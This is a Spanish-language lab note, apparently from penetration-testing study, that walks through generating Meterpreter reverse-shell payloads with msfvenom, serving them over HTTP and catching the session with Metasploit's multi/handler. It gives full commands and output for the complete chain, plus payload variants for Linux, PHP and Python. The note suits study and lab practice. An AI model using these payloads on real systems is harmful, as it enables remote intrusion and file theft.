# Crear Payloads con Msfvenom

> [!info] Idea principal
> `msfvenom` permite generar payloads (por ejemplo un `.exe` malicioso) para conseguir una shell. Despues me pongo a la escucha con el `multi/handler` de Metasploit para recibir la conexion.

> [!warning] Importante
> Todo esto se hace en un laboratorio controlado. Usar estas tecnicas solo en maquinas propias o con permiso.

## Que es Msfvenom

`msfvenom` es la herramienta de Metasploit para generar payloads en distintos formatos.

Con `msfvenom` puedo crear:

- Ejecutables para Windows (`.exe`).
- Binarios para Linux (`elf`).
- Scripts (`.py`, `.php`, `.sh`).
- Payloads en muchos otros formatos.

## Resumen del Ataque

> [!example] Fases
> 1. Generar el payload con `msfvenom`.
> 2. Compartir el archivo con un servidor HTTP.
> 3. Descargar y ejecutar el payload en la victima.
> 4. Ponerse a la escucha con `multi/handler`.
> 5. Recibir la sesion de Meterpreter.

## Fase 1: Generar el Payload

Creo un ejecutable de Windows con un payload de Meterpreter:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=443 -f exe -o pwned.exe
```

Salida:

```text
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: pwned.exe
```

### Explicacion del Comando

- `msfvenom`: ejecuta la herramienta.
- `-p windows/x64/meterpreter/reverse_tcp`: payload a usar (Meterpreter con conexion inversa).
- `LHOST=192.168.0.8`: IP de mi maquina atacante (donde recibire la conexion).
- `LPORT=443`: puerto donde escuchare.
- `-f exe`: formato de salida (ejecutable de Windows).
- `-o pwned.exe`: nombre del archivo generado.

> [!tip] reverse_tcp
> En una conexion inversa (*reverse*), la victima se conecta hacia mi maquina. Por eso el `LHOST` y `LPORT` son los de mi maquina atacante.

## Fase 2: Compartir el Payload

Confirmo que el archivo existe:

```bash
ls
```

Salida:

```text
Desktop  Documents  Downloads  escaneo  escaneo_principal  Music  Pictures  Projects  Public  pwned.exe  Templates  Videos
```

Levanto un servidor HTTP con Python para que la victima pueda descargarlo:

```bash
python3 -m http.server 80
```

Salida (se ve la descarga desde la victima):

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.48 - - [08/Aug/2026 11:56:05] "GET /pwned.exe HTTP/1.1" 200 -
```

> [!note] Que veo aqui
> La IP `192.168.0.48` (la victima) ha descargado `pwned.exe` correctamente (codigo `200`).

## Fase 3: Ponerse a la Escucha con multi/handler

`multi/handler` es la alternativa de Metasploit a Netcat para recibir la conexion del payload.

Abro Metasploit:

```bash
msfconsole
```

Cargo el handler:

```text
use multi/handler
```

Configuro el mismo payload que use en `msfvenom`:

```text
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

> [!warning] Muy importante
> El payload, `LHOST` y `LPORT` del handler deben coincidir **exactamente** con los que puse al generar el `.exe`. Si no coinciden, la sesion no se establece.

Configuro la IP y el puerto de escucha:

```text
set LHOST 192.168.0.8
set LPORT 443
```

Reviso que todo este correcto:

```text
show options
```

Salida:

```text
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST     192.168.0.8      yes       The listen address
   LPORT     443              yes       The listen port
```

## Fase 4: Recibir la Sesion

Lanzo el handler:

```text
run
```

Cuando la victima ejecuta `pwned.exe`, llega la conexion:

```text
[*] Started reverse TCP handler on 192.168.0.8:443
[*] Sending stage (248902 bytes) to 192.168.0.48
[*] Meterpreter session 1 opened (192.168.0.8:443 -> 192.168.0.48:49195)
```

> [!success] Sesion conseguida
> Se abre una sesion de Meterpreter contra la maquina `192.168.0.48`.

## Fase 5: Comprobar el Acceso

Ya dentro de Meterpreter, compruebo el usuario:

```text
getuid
```

Salida:

```text
Server username: mario-PC\mario
```

Y reviso informacion del sistema:

```text
sysinfo
```

Salida:

```text
Computer        : MARIO-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

> [!note] Resultado
> Tengo una sesion de Meterpreter en una maquina Windows 7 como el usuario `mario`. Desde aqui podria seguir con post-explotacion o escalada de privilegios.

## Otros Formatos Utiles de Msfvenom

### Payload para Linux

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=443 -f elf -o pwned.elf
```

### Payload en PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=443 -f raw -o shell.php
```

### Payload en Python

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=443 -f raw -o shell.py
```

### Ver Payloads Disponibles

```bash
msfvenom --list payloads
```

### Ver Formatos Disponibles

```bash
msfvenom --list formats
```

## Comandos Basicos de Meterpreter

- `getuid`: ver el usuario actual.
- `sysinfo`: informacion del sistema.
- `pwd`: directorio actual.
- `ls`: listar archivos.
- `download archivo`: descargar un archivo de la victima.
- `upload archivo`: subir un archivo a la victima.
- `shell`: abrir una shell del sistema.
- `background`: dejar la sesion en segundo plano.

## Checklist Rapido

- [ ] Generar el payload con `msfvenom`.
- [ ] Anotar el payload, `LHOST` y `LPORT` usados.
- [ ] Compartir el archivo (por ejemplo con `python3 -m http.server`).
- [ ] Abrir Metasploit y cargar `multi/handler`.
- [ ] Configurar el mismo payload, `LHOST` y `LPORT`.
- [ ] Lanzar el handler con `run`.
- [ ] Ejecutar el payload en la victima.
- [ ] Comprobar la sesion con `getuid` y `sysinfo`.
